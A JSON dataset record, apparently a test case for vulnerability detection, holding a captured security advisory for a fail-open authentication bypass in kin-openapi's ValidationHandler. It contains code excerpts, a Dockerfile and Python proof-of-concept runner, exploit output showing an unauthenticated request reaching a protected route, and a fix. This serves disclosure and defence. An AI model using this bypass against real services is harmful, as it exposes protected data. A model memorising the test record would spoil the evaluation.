@@ -1,0 +1,202 @@
+{
+  "adjudication": {
+    "admission_output_used": false,
+    "basis": "source_observation",
+    "corpus_v1_evidence_used": false,
+    "corpus_v1_labels_used": false,
+    "corpus_v1_scores_used": false,
+    "detector_output_used": false,
+    "expected_condition_signals": [],
+    "notes": "Partial public-source metadata only; intentionally insufficient as a positive condition.",
+    "ranking_output_used": false,
+    "v6_first_blind_case_errors_used": false,
+    "v6_first_blind_score_used": false
+  },
+  "capture_method": "passive_source_snapshot",
+  "capture_reference": "https://github.com/getkin/kin-openapi/security/advisories/GHSA-r277-6w6q-xmqw",
+  "captured_at": "2026-08-14T18:58:04.401891+00:00",
+  "case_kind": "sparse_noisy",
+  "collector": {
+    "kind": "v7_public_source_literal_draft",
+    "target_contact_performed": false,
+    "third_party_code_executed": false,
+    "version": "1.0.0"
+  },
+  "family": "authentication_session",
+  "raw": {
+    "details": {
+      "observation_kind": "partial_public_source_metadata",
+      "source_project": "getkin/kin-openapi",
+      "version_boundaries": [
+        {
+          "ecosystem": "go",
+          "package": "github.com/getkin/kin-openapi",
+          "patched_version": "v0.144.0",
+          "vulnerable_version_range": "<= v0.143.0"
+        },
+        {
+          "ecosystem": "go",
+          "package": "github.com/getkin/kin-openapi",
+          "patched_version": "0.144.0",
+          "vulnerable_version_range": "<= 0.143.0"
+        }
+      ],
+      "version_boundary_count": 2
+    },
+    "method": "UNKNOWN"
+  },
+  "source_project": "getkin/kin-openapi",
+  "source_root": "GHSA-r277-6w6q-xmqw",
+  "source_snapshot": {
+    "payload": {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "EQSTLab",
+          "type": "reporter"
+        },
+        {
+          "login": "232-323",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/148991397?v=4",
+            "events_url": "https://api.github.com/users/EQSTLab/events{/privacy}",
+            "followers_url": "https://api.github.com/users/EQSTLab/followers",
+            "following_url": "https://api.github.com/users/EQSTLab/following{/other_user}",
+            "gists_url": "https://api.github.com/users/EQSTLab/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/EQSTLab",
+            "id": 148991397,
+            "login": "EQSTLab",
+            "node_id": "U_kgDOCOFtpQ",
+            "organizations_url": "https://api.github.com/users/EQSTLab/orgs",
+            "received_events_url": "https://api.github.com/users/EQSTLab/received_events",
+            "repos_url": "https://api.github.com/users/EQSTLab/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/EQSTLab/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/EQSTLab/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/EQSTLab",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/196280629?v=4",
+            "events_url": "https://api.github.com/users/232-323/events{/privacy}",
+            "followers_url": "https://api.github.com/users/232-323/followers",
+            "following_url": "https://api.github.com/users/232-323/following{/other_user}",
+            "gists_url": "https://api.github.com/users/232-323/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/232-323",
+            "id": 196280629,
+            "login": "232-323",
+            "node_id": "U_kgDOC7MBNQ",
+            "organizations_url": "https://api.github.com/users/232-323/orgs",
+            "received_events_url": "https://api.github.com/users/232-323/received_events",
+            "repos_url": "https://api.github.com/users/232-323/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/232-323/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/232-323/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/232-323",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-73501",
+      "cvss": {
+        "score": 9.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 9.1,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-287"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-287",
+          "name": "Improper Authentication"
+        }
+      ],
+      "description": "## ValidationHandler.Load() Fail-Open Authentication Bypass via NoopAuthenticationFunc Default\r\n\r\n### Summary\r\n`ValidationHandler.Load()` in `getkin/kin-openapi` silently replaces a nil `AuthenticationFunc` with `NoopAuthenticationFunc`, which always returns `nil` without performing any credential check. Because this substitution happens unconditionally when the caller omits the field, every OpenAPI `security` requirement declared in the spec is silently satisfied for unauthenticated requests. An unauthenticated remote attacker can reach handlers for routes whose OpenAPI operation requires an API key, OAuth token, or any other security scheme if the application relies on `ValidationHandler` as its enforcement middleware. CVSS base score is 9.1 (Critical).\r\n\r\n### Details\r\n`ValidationHandler` is an HTTP middleware exported by `openapi3filter` that validates incoming requests and responses against a loaded OpenAPI specification. Its `Load()` method initialises default fields before the handler begins serving:\r\n\r\n```go\r\n// openapi3filter/validation_handler.go:47-49\r\nif h.AuthenticationFunc == nil {\r\n    h.AuthenticationFunc = NoopAuthenticationFunc\r\n}\r\n```\r\n\r\n`NoopAuthenticationFunc` is defined as:\r\n\r\n```go\r\n// openapi3filter/validation_handler.go:17-18\r\nfunc NoopAuthenticationFunc(context.Context, *AuthenticationInput) error { return nil }\r\n```\r\n\r\nIt always returns `nil`, meaning every security scheme check it handles is automatically approved.\r\n\r\nWhen a request arrives, `ServeHTTP` → `before` → `validateRequest` assembles a `RequestValidationInput` with the current `AuthenticationFunc` (now the no-op) injected into `Options`:\r\n\r\n```go\r\n// openapi3filter/validation_handler.go:91-103\r\noptions := &Options{\r\n    AuthenticationFunc: h.AuthenticationFunc,\r\n}\r\nrequestValidationInput := &RequestValidationInput{\r\n    Request:    r,\r\n    PathParams: pathParams,\r\n    Route:      route,\r\n    Options:    options,\r\n}\r\nif err = ValidateRequest(r.Context(), requestValidationInput); err != nil {\r\n    return err\r\n}\r\n```\r\n\r\nInside `ValidateRequest`, each security requirement calls `options.AuthenticationFunc`:\r\n\r\n```go\r\n// openapi3filter/validate_request.go:436-438\r\nf := options.AuthenticationFunc\r\nif f == nil {\r\n    return ErrAuthenticationServiceMissing   // fail-closed path — never reached via ValidationHandler\r\n}\r\n// ...\r\n// openapi3filter/validate_request.go:497-503\r\nif err := f(ctx, &AuthenticationInput{...}); err != nil {\r\n    return err\r\n}\r\n```\r\n\r\nBecause `f` is the no-op (not `nil`), the `ErrAuthenticationServiceMissing` guard is never triggered and `f(...)` returns `nil`, clearing the security requirement. Control then proceeds to the protected handler (`validation_handler.go:61-62`).\r\n\r\nThe critical contradiction is that callers who use `ValidateRequest` directly with a nil `AuthenticationFunc` get fail-closed behavior (`ErrAuthenticationServiceMissing`), while callers who use the higher-level `ValidationHandler` with a nil `AuthenticationFunc` get fail-open behavior. Since omitting `AuthenticationFunc` is the natural default, the majority of real-world integrations are vulnerable.\r\n\r\nAffected source file and line: `openapi3filter/validation_handler.go:47–49` (commit `30e2923`, tag `v0.143.0`).\r\n\r\n### PoC\r\n**Environment**\r\n\r\n```\r\nDocker (any version supporting multi-stage builds)\r\nGo 1.25 (inside the container via golang:1.25-alpine)\r\ngetkin/kin-openapi v0.143.0 (local source copy)\r\n```\r\n\r\n**Step 1 — Build the Docker image**\r\n\r\nFrom the repository root (parent of `vuln-001/`):\r\n\r\n```bash\r\ndocker build \\\r\n  -t vuln001-auth-bypass-poc \\\r\n  -f vuln-001/Dockerfile \\\r\n  reports/github_web_233_getkin__kin-openapi\r\n```\r\n\r\nThe `Dockerfile` copies the local `kin-openapi` source into `/kin-openapi/` inside the image and builds a Go binary (`/poc-binary`) from `main.go`. The `go.mod` inside the image uses a `replace` directive pointing to `/kin-openapi`, so no network access to the Go module proxy is required.\r\n\r\n**Step 2 — Run the container**\r\n\r\n```bash\r\ndocker run --rm --network none vuln001-auth-bypass-poc\r\n```\r\n\r\n**Step 3 (alternative) — Use the Python helper**\r\n\r\n```bash\r\npython3 vuln-001/poc.py --no-cleanup\r\n```\r\n\r\n**What the PoC does**\r\n\r\n`main.go` creates a temporary OpenAPI 3.0 spec that declares `GET /secret` as protected by an `apiKey` security scheme:\r\n\r\n```yaml\r\npaths:\r\n  /secret:\r\n    get:\r\n      security:\r\n        - apiKey: []\r\ncomponents:\r\n  securitySchemes:\r\n    apiKey:\r\n      type: apiKey\r\n      name: X-Api-Key\r\n      in: header\r\n```\r\n\r\nIt then constructs a `ValidationHandler` **without** setting `AuthenticationFunc`, calls `Load()`, and sends a request with no `X-Api-Key` header:\r\n\r\n```http\r\nGET /secret HTTP/1.1\r\nHost: example.test\r\n# X-Api-Key header is intentionally absent\r\n```\r\n\r\n**Expected (vulnerable) output**\r\n\r\n```\r\n=== CONTRAST: Direct ValidateRequest with nil AuthenticationFunc ===\r\n  Direct ValidateRequest (nil auth) => ERROR: security requirements failed: missing AuthenticationFunc\r\n  -> Fail-CLOSED behavior confirmed: missing auth function is rejected\r\n\r\n=== EXPLOIT: ValidationHandler.Load() with nil AuthenticationFunc ===\r\n  OpenAPI spec defines: security: [{apiKey: []}] on GET /secret\r\n  ValidationHandler.AuthenticationFunc: NOT SET (nil)\r\n  Load() will inject NoopAuthenticationFunc, which always returns nil\r\n\r\n  Request:  GET /secret  (X-Api-Key header: absent)\r\n  Response: status=200  body=\"SECRET_DATA\\n\"\r\n\r\n[EXPLOIT SUCCESS] Auth bypass confirmed!\r\n  Protected resource /secret returned SECRET_DATA without credentials.\r\n  ValidationHandler.Load() silently injected NoopAuthenticationFunc.\r\n  Security requirement was bypassed. VULN-001 REPRODUCED.\r\n```\r\n\r\nThe contrast block confirms fail-closed behavior when `ValidateRequest` is called directly. The exploit block confirms fail-open behavior through `ValidationHandler`. Status 200 and `SECRET_DATA` are returned without any credential.\r\n\r\n**Remediation patch**\r\n\r\n```diff\r\n--- a/openapi3filter/validation_handler.go\r\n+++ b/openapi3filter/validation_handler.go\r\n@@\r\n  if h.Handler == nil {\r\n      h.Handler = http.DefaultServeMux\r\n  }\r\n- if h.AuthenticationFunc == nil {\r\n-     h.AuthenticationFunc = NoopAuthenticationFunc\r\n- }\r\n  if h.ErrorEncoder == nil {\r\n      h.ErrorEncoder = DefaultErrorEncoder\r\n  }\r\n```\r\n\r\nAfter this change, a nil `AuthenticationFunc` propagates into `ValidateRequest`, which returns `ErrAuthenticationServiceMissing` and rejects the request. Callers who genuinely want to skip authentication can still opt in explicitly: `h.AuthenticationFunc = openapi3filter.NoopAuthenticationFunc`.\r\n\r\n### Impact\r\nThis is an **authentication bypass** vulnerability (CWE-287). Any application that:\r\n\r\n1. uses `openapi3filter.ValidationHandler` as its HTTP middleware, and\r\n2. declares one or more `security` requirements in its OpenAPI specification, and\r\n3. does **not** explicitly set `AuthenticationFunc`,\r\n\r\nis fully exposed. An unauthenticated remote attacker can send requests to any protected endpoint without supplying credentials; the middleware accepts the request and forwards it to the underlying handler as if authentication had succeeded.\r\n\r\nAffected parties include all Go services that adopt `ValidationHandler` as a drop-in validation layer and rely on OpenAPI `security` declarations for access control without adding a separate authentication layer upstream (e.g., an API gateway or reverse proxy). Because the insecure behavior is the default, developers following the \"getting started\" path are affected without any additional mistake.\r\n\r\nThe confidentiality and integrity of data behind secured endpoints are both at high risk. Availability is not directly affected by this vulnerability.\r\n\r\n### Reproduction artifacts\r\n\r\n#### `Dockerfile`\r\n\r\n```dockerfile\r\nFROM golang:1.25-alpine\r\n\r\n# Install git (needed by go mod for some packages)\r\nRUN apk add --no-cache git\r\n\r\nWORKDIR /workspace\r\n\r\n# Copy the vulnerable kin-openapi repository as a local module replacement\r\nCOPY repo/ /kin-openapi/\r\n\r\n# Set up the PoC Go module\r\nRUN mkdir -p /workspace/poc\r\nWORKDIR /workspace/poc\r\n\r\n# Create go.mod that uses the local copy of the vulnerable kin-openapi\r\nRUN cat > go.mod <<'EOF'\r\nmodule kin-openapi-auth-bypass-poc\r\n\r\ngo 1.25\r\n\r\nrequire github.com/getkin/kin-openapi v0.143.0\r\n\r\nreplace github.com/getkin/kin-openapi => /kin-openapi\r\nEOF\r\n\r\n# Copy the PoC source (build context is the parent directory of vuln-001/)\r\nCOPY vuln-001/main.go /workspace/poc/main.go\r\n\r\n# Resolve dependencies and build\r\nRUN go mod tidy && \\\r\n    go build -o /poc-binary .\r\n\r\n# Run the PoC\r\nCMD [\"/poc-binary\"]\r\n```\r\n\r\n#### `poc.py`\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nPoC for VULN-001: ValidationHandler.Load() Fail-Open Auth Bypass via NoopAuthenticationFunc Default\r\nRepository: getkin/kin-openapi v0.143.0\r\nCWE: CWE-287 (Improper Authentication)\r\nCVSS: 9.1 (Critical)\r\n\r\nVulnerability Summary:\r\n    ValidationHandler.Load() silently replaces a nil AuthenticationFunc with NoopAuthenticationFunc.\r\n    NoopAuthenticationFunc always returns nil (no error), so any OpenAPI security requirement\r\n    passes without validation when the user forgets to set AuthenticationFunc.\r\n\r\n    Contrast: ValidateRequest() with nil AuthenticationFunc returns ErrAuthenticationServiceMissing\r\n    (fail-closed). ValidationHandler.Load() breaks this guarantee (fail-open).\r\n\r\nUsage:\r\n    python3 poc.py [--build-dir <dir>] [--image <name>] [--no-cleanup]\r\n\"\"\"\r\n\r\nimport argparse\r\nimport os\r\nimport subprocess\r\nimport sys\r\nimport json\r\n\r\nIMAGE_NAME = \"vuln001-auth-bypass-poc\"\r\nSCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))\r\nREPO_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), \"repo\")\r\n\r\nSUCCESS_MARKER = \"[EXPLOIT SUCCESS]\"\r\nEXPECTED_STATUS = \"status=200\"\r\nEXPECTED_BODY = 'body=\"SECRET_DATA\\\\n\"'\r\n\r\n\r\ndef run(cmd, **kwargs):\r\n    \"\"\"Run a shell command and return (returncode, stdout, stderr).\"\"\"\r\n    print(f\"[CMD] {' '.join(cmd)}\")\r\n    result = subprocess.run(cmd, capture_output=True, text=True, **kwargs)\r\n    if result.stdout:\r\n        print(result.stdout, end=\"\")\r\n    if result.stderr:\r\n        print(result.stderr, end=\"\", file=sys.stderr)\r\n    return result.returncode, result.stdout, result.stderr\r\n\r\n\r\ndef build_image(build_dir):\r\n    \"\"\"Build the Docker image containing the PoC binary.\"\"\"\r\n    print(\"\\n[*] Building Docker image ...\")\r\n    rc, stdout, stderr = run([\r\n        \"docker\", \"build\",\r\n        \"--build-arg\", f\"REPO_DIR={REPO_DIR}\",\r\n        \"-t\", IMAGE_NAME,\r\n        \"-f\", os.path.join(build_dir, \"Dockerfile\"),\r\n        # Build context is the reports root so both Dockerfile and repo/ are reachable\r\n        os.path.dirname(build_dir),\r\n    ])\r\n    if rc != 0:\r\n        print(f\"[ERROR] Docker build failed (exit {rc})\", file=sys.stderr)\r\n        sys.exit(rc)\r\n    print(\"[*] Docker build succeeded.\")\r\n    return f\"docker build -t {IMAGE_NAME} -f {os.path.join(build_dir, 'Dockerfile')} {os.path.dirname(build_dir)}\"\r\n\r\n\r\ndef run_container():\r\n    \"\"\"Run the container and capture output.\"\"\"\r\n    print(\"\\n[*] Running PoC container ...\")\r\n    rc, stdout, stderr = run([\r\n        \"docker\", \"run\", \"--rm\",\r\n        \"--network\", \"none\",   # no network access needed\r\n        IMAGE_NAME,\r\n    ])\r\n    combined = stdout + stderr\r\n    return rc, combined\r\n\r\n\r\ndef evaluate(exit_code, output):\r\n    \"\"\"Determine whether the exploit was confirmed.\"\"\"\r\n    passed = (\r\n        exit_code == 0\r\n        and SUCCESS_MARKER in output\r\n        and EXPECTED_STATUS in output\r\n        and EXPECTED_BODY in output\r\n    )\r\n    return passed\r\n\r\n\r\ndef cleanup_image():\r\n    \"\"\"Remove the Docker image.\"\"\"\r\n    print(f\"\\n[*] Removing Docker image {IMAGE_NAME} ...\")\r\n    run([\"docker\", \"rmi\", \"-f\", IMAGE_NAME])\r\n\r\n\r\ndef main():\r\n    global IMAGE_NAME\r\n    parser = argparse.ArgumentParser(description=\"VULN-001 Auth Bypass PoC runner\")\r\n    parser.add_argument(\"--build-dir\", default=SCRIPT_DIR,\r\n                        help=\"Directory containing Dockerfile and main.go\")\r\n    parser.add_argument(\"--image\", default=IMAGE_NAME,\r\n                        help=\"Docker image name to build/run\")\r\n    parser.add_argument(\"--no-cleanup\", action=\"store_true\",\r\n                        help=\"Keep the Docker image after the run\")\r\n    args = parser.parse_args()\r\n    IMAGE_NAME = args.image\r\n\r\n    print(\"=\" * 60)\r\n    print(\"VULN-001 PoC: Auth Bypass via NoopAuthenticationFunc Default\")\r\n    print(\"=\" * 60)\r\n    print(f\"  Build dir : {args.build_dir}\")\r\n    print(f\"  Repo dir  : {REPO_DIR}\")\r\n    print(f\"  Image     : {IMAGE_NAME}\")\r\n\r\n    build_cmd = build_image(args.build_dir)\r\n    run_cmd = f\"docker run --rm --network none {IMAGE_NAME}\"\r\n\r\n    exit_code, output = run_container()\r\n\r\n    if not args.no_cleanup:\r\n        cleanup_image()\r\n\r\n    passed = evaluate(exit_code, output)\r\n\r\n    print(\"\\n\" + \"=\" * 60)\r\n    if passed:\r\n        print(\"[RESULT] PASS — Auth bypass CONFIRMED\")\r\n        print(\"  The protected handler returned SECRET_DATA without credentials.\")\r\n        print(\"  ValidationHandler.Load() injected NoopAuthenticationFunc silently.\")\r\n    else:\r\n        print(f\"[RESULT] FAIL — Exploit not confirmed (exit={exit_code})\")\r\n\r\n    print(f\"\\nContainer exit code : {exit_code}\")\r\n    print(f\"Success marker found: {SUCCESS_MARKER in output}\")\r\n    print(f\"Status 200 found    : {EXPECTED_STATUS in output}\")\r\n    print(f\"Secret body found   : {EXPECTED_BODY in output}\")\r\n\r\n    # Exit with code that signals pass/fail\r\n    sys.exit(0 if passed else 1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```",
+      "ghsa_id": "GHSA-r277-6w6q-xmqw",
+      "html_url": "https://github.com/getkin/kin-openapi/security/advisories/GHSA-r277-6w6q-xmqw",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-r277-6w6q-xmqw"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-73501"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-07-23T23:13:41Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/278727?v=4",
+        "events_url": "https://api.github.com/users/fenollp/events{/privacy}",
+        "followers_url": "https://api.github.com/users/fenollp/followers",
+        "following_url": "https://api.github.com/users/fenollp/following{/other_user}",
+        "gists_url": "https://api.github.com/users/fenollp/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/fenollp",
+        "id": 278727,
+        "login": "fenollp",
+        "node_id": "MDQ6VXNlcjI3ODcyNw==",
+        "organizations_url": "https://api.github.com/users/fenollp/orgs",
+        "received_events_url": "https://api.github.com/users/fenollp/received_events",
+        "repos_url": "https://api.github.com/users/fenollp/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/fenollp/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/fenollp/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/fenollp",
+        "user_view_type": "public"
+      },
+      "severity": "critical",
+      "state": "published",
+      "submission": null,
+      "summary": "ValidationHandler.Load() Fail-Open Authentication Bypass via NoopAuthenticationFunc Default",
+      "updated_at": "2026-08-12T21:22:59Z",
+      "url": "https://api.github.com/repos/getkin/kin-openapi/security-advisories/GHSA-r277-6w6q-xmqw",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/getkin/kin-openapi"
+          },
+          "patched_versions": "v0.144.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "<= v0.143.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    "reference": "https://github.com/getkin/kin-openapi/security/advisories/GHSA-r277-6w6q-xmqw",
+    "retrieved_at": "2026-08-14T18:58:04.401896+00:00",
+    "snapshot_role": "canonical_source"
+  }
+}
